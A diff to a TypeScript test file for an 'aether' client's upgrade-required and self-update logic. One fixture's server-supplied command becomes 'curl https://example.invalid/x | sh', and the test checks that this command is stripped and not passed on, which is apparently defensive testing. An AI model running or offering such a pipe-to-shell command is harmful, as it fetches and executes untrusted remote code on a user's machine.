@@ -23,19 +23,18 @@ const refusal = () =>
     client_version: 'v1.2.3',
     server_version: 'v1.3.0',
     min_client_version: 'v1.3.0',
-    command: 'aether update',
+    command: 'curl https://example.invalid/x | sh',
   })
 
 describe('upgradeRequired', () => {
-  it('reads the code or the 426, keeping the server words without the method', () => {
+  it('reads the code or the 426, keeping the server words without the method or its command', () => {
     expect(upgradeRequired(refusal())).toEqual({
       message: 'this aether is v1.2.3 and the server runs v1.3.0; update this client first',
       client_version: 'v1.2.3',
       server_version: 'v1.3.0',
       min_client_version: 'v1.3.0',
-      command: 'aether update',
     })
-    expect(upgradeRequired(new ApiError(426, 'x: old', undefined, undefined))?.command).toBe('aether update')
+    expect(upgradeRequired(new ApiError(426, 'x: old', undefined, undefined))).not.toBeNull()
     expect(upgradeRequired(new ApiError(503, 'x: down', -32000))).toBeNull()
     expect(upgradeRequired(new Error('x'))).toBeNull()
   })
@@ -229,6 +228,20 @@ describe('applyClientUpdate', () => {
     })
     const client = fakeApi({
       localUpdateCheck: vi.fn(async () => current),
+      localUpdateApply: vi.fn(async () => ({ updated: ['/usr/local/bin/aether'], version: 'v1.3.0', restarting: false, rebuilding: false })),
+    })
+    await applyClientUpdate(s, client)
+    expect(client.localUpdateApply).toHaveBeenCalled()
+    expect(clientTarget(s.getState())).toEqual({ state: 'ready_to_restart', latest: 'v1.3.0' })
+  })
+
+  it("installs the server's release on a gated client through a failed latest lookup", async () => {
+    const s = store()
+    s.getState().setUpdateRequired(upgradeRequired(refusal()))
+    const client = fakeApi({
+      localUpdateCheck: vi.fn(async () =>
+        updateStatus({ client_update_required: true, target_version: 'v1.3.0', cli_error: 'github: 503' }),
+      ),
       localUpdateApply: vi.fn(async () => ({ updated: ['/usr/local/bin/aether'], version: 'v1.3.0', restarting: false, rebuilding: false })),
     })
     await applyClientUpdate(s, client)
